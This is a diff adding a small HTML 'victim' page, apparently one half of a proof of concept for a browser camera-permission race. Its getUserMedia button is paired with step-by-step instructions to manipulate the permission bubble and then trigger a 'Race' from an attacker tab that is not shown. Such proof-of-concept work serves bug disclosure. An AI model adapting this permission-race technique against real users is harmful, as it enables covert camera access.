@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Settings</title>
+<style>
+body{font-family:system-ui;max-width:380px;margin:40px auto;padding:20px}
+button{display:block;width:100%;padding:11px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f9f9f9}
+pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;font-family:monospace;white-space:pre-wrap}
+</style>
+</head>
+<body>
+<h1>Settings</h1>
+<button onclick="step1()">Enable Camera</button>
+<pre id="L">[victim — localhost:9081]
+
+STEP A: Click "Enable Camera" → on the popup prompt, click BLOCK.
+
+STEP B: Look at the address bar — you'll see a blocked camera icon 🔒.
+         CLICK that icon.
+
+STEP C: In the bubble that opens, select "Allow" or "Always allow".
+         DO NOT click Done. DO NOT close the bubble.
+
+STEP D: Switch back to the attacker tab and click "3. Race".</pre>
+
+<script>
+var log = function(m){ var e = document.getElementById('L'); e.textContent += m + '\n'; };
+
+function step1(){
+  log('Calling getUserMedia...');
+  navigator.mediaDevices.getUserMedia({video:true})
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('GRANTED — click BLOCK on the prompt'); })
+    .catch(function(e){ log('Camera state: ' + e.name); });
+}
+</script>
+</body>
+</html>
